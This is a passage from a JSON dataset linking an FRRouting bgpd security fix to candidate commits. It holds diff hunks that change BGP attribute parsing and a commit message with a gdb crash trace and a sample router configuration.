          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "3349: }",
          "3353: {",
          "3354:  uint8_t type = 0;",
          "3359:   return BGP_ATTR_PARSE_PROCEED;",
          "",
          "[Removed Lines]",
          "3352: static int bgp_attr_check(struct peer *peer, struct attr *attr)",
          "3358:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag)",
          "",
          "[Added Lines]",
          "3352: static int bgp_attr_check(struct peer *peer, struct attr *attr,",
          "3353:      bgp_size_t length)",
          "3359:  if (CHECK_FLAG(peer->cap, PEER_CAP_RESTART_RCV) && !attr->flag &&",
          "3360:      !length)",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3407:  enum bgp_attr_parse_ret ret;",
          "3408:  uint8_t flag = 0;",
          "3409:  uint8_t type = 0;",
          "3411:  uint8_t *startp, *endp;",
          "3412:  uint8_t *attr_endp;",
          "3413:  uint8_t seen[BGP_ATTR_BITMAP_SIZE];",
          "",
          "[Removed Lines]",
          "3410:  bgp_size_t length;",
          "",
          "[Added Lines]",
          "3412:  bgp_size_t length = 0;",
          "",
          "---------------",
          "--- Hunk 3 ---",
          "[Context before]",
          "3730:  }",
          "3734:  if (ret < 0)",
          "3735:   goto done;",
          "",
          "[Removed Lines]",
          "3733:  ret = bgp_attr_check(peer, attr);",
          "",
          "[Added Lines]",
          "3735:  ret = bgp_attr_check(peer, attr, length);",
          "",
          "---------------"
        ]
      }
    },
    {
      "candidate_hash": "b08afc81c60607a4f736f418f2e3eb06087f1a35",
      "candidate_info": {
        "commit_hash": "b08afc81c60607a4f736f418f2e3eb06087f1a35",
        "repo": "FRRouting/frr",
        "commit_url": "https://github.com/FRRouting/frr/commit/b08afc81c60607a4f736f418f2e3eb06087f1a35",
        "files": [
          "bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c"
        ],
        "message": "bgpd: Handle MP_REACH_NLRI malformed packets with session reset\n\nAvoid crashing bgpd.\n\n```\n(gdb)\nbgp_mp_reach_parse (args=<optimized out>, mp_update=0x7fffffffe140) at bgpd/bgp_attr.c:2341\n2341\t\t\tstream_get(&attr->mp_nexthop_global, s, IPV6_MAX_BYTELEN);\n(gdb)\nstream_get (dst=0x7fffffffe1ac, s=0x7ffff0006e80, size=16) at lib/stream.c:320\n320\t{\n(gdb)\n321\t\tSTREAM_VERIFY_SANE(s);\n(gdb)\n323\t\tif (STREAM_READABLE(s) < size) {\n(gdb)\n34\t  return __builtin___memcpy_chk (__dest, __src, __len, __bos0 (__dest));\n(gdb)\n\nThread 1 \"bgpd\" received signal SIGSEGV, Segmentation fault.\n0x00005555556e37be in route_set_aspath_prepend (rule=0x555555aac0d0, prefix=0x7fffffffe050,\n    object=0x7fffffffdb00) at bgpd/bgp_routemap.c:2282\n2282\t\tif (path->attr->aspath->refcnt)\n(gdb)\n```\n\nWith the configuration:\n\n```\n neighbor 127.0.0.1 remote-as external\n neighbor 127.0.0.1 passive\n neighbor 127.0.0.1 ebgp-multihop\n neighbor 127.0.0.1 disable-connected-check\n neighbor 127.0.0.1 update-source 127.0.0.2\n neighbor 127.0.0.1 timers 3 90\n neighbor 127.0.0.1 timers connect 1\n address-family ipv4 unicast\n  redistribute connected\n  neighbor 127.0.0.1 default-originate\n  neighbor 127.0.0.1 route-map RM_IN in\n exit-address-family\n!\nroute-map RM_IN permit 10\n set as-path prepend 200\nexit\n```\n\nReported-by: Iggy Frankovic <iggyfran@amazon.com>\nSigned-off-by: Donatas Abraitis <donatas@opensourcerouting.org>",
        "before_after_code_files": [
          "bgpd/bgp_attr.c||bgpd/bgp_attr.c",
          "bgpd/bgp_attr.h||bgpd/bgp_attr.h",
          "bgpd/bgp_packet.c||bgpd/bgp_packet.c"
        ]
      },
      "candidate_patch_features": {
        "candidate_earlier_than_patch": 0,
        "same_pr": 1,
        "olp_pr_links": [
          "https://github.com/FRRouting/frr/pull/14645"
        ],
        "olp_code_files": {
          "patch": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ],
          "candidate": [
            "bgpd/bgp_attr.c||bgpd/bgp_attr.c"
          ]
        }
      },
      "candidate_diff": {
        "bgpd/bgp_attr.c||bgpd/bgp_attr.c": [
          "File: bgpd/bgp_attr.c -> bgpd/bgp_attr.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2422:   mp_update->afi = afi;",
          "2423:   mp_update->safi = safi;",
          "2425:  }",
          "2427:  mp_update->afi = afi;",
          "",
          "[Removed Lines]",
          "2424:   return BGP_ATTR_PARSE_EOR;",
          "",
          "[Added Lines]",
          "2424:   return bgp_attr_malformed(args, BGP_NOTIFY_UPDATE_MAL_ATTR, 0);",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "3759:    goto done;",
          "3760:   }",
          "3766:   if (ret == BGP_ATTR_PARSE_ERROR) {",
          "3767:    flog_warn(EC_BGP_ATTRIBUTE_PARSE_ERROR,",
          "3768:       \"%s: Attribute %s, parse error\", peer->host,",
          "",
          "[Removed Lines]",
          "3762:   if (ret == BGP_ATTR_PARSE_EOR) {",
          "3763:    goto done;",
          "3764:   }",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_attr.h||bgpd/bgp_attr.h": [
          "File: bgpd/bgp_attr.h -> bgpd/bgp_attr.h",
          "--- Hunk 1 ---",
          "[Context before]",
          "366:  BGP_ATTR_PARSE_ERROR_NOTIFYPLS = -3,",
          "368: };",
          "370: struct bpacket_attr_vec_arr;",
          "",
          "[Removed Lines]",
          "367:  BGP_ATTR_PARSE_EOR = -4,",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ],
        "bgpd/bgp_packet.c||bgpd/bgp_packet.c": [
          "File: bgpd/bgp_packet.c -> bgpd/bgp_packet.c",
          "--- Hunk 1 ---",
          "[Context before]",
          "2402:   afi_t afi = 0;",
          "2403:   safi_t safi;",
          "2404:   struct graceful_restart_info *gr_info;",
          "",
          "[Removed Lines]",
          "2400:  if ((!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0)",
          "2401:      || (attr_parse_ret == BGP_ATTR_PARSE_EOR)) {",
          "",
          "[Added Lines]",
          "2400:  if (!update_len && !withdraw_len && nlris[NLRI_MP_UPDATE].length == 0) {",
          "",
          "---------------",
          "--- Hunk 2 ---",
          "[Context before]",
          "2419:       && nlris[NLRI_MP_WITHDRAW].length == 0) {",
          "2420:    afi = nlris[NLRI_MP_WITHDRAW].afi;",
          "2421:    safi = nlris[NLRI_MP_WITHDRAW].safi;",
          "2425:   }",
          "2427:   if (afi && peer->afc[afi][safi]) {",
          "",
          "[Removed Lines]",
          "2422:   } else if (attr_parse_ret == BGP_ATTR_PARSE_EOR) {",
          "2423:    afi = nlris[NLRI_MP_UPDATE].afi;",
          "2424:    safi = nlris[NLRI_MP_UPDATE].safi;",
          "",
          "[Added Lines]",
          "[None]",
          "",
          "---------------"
        ]
      }
    }
  ]
}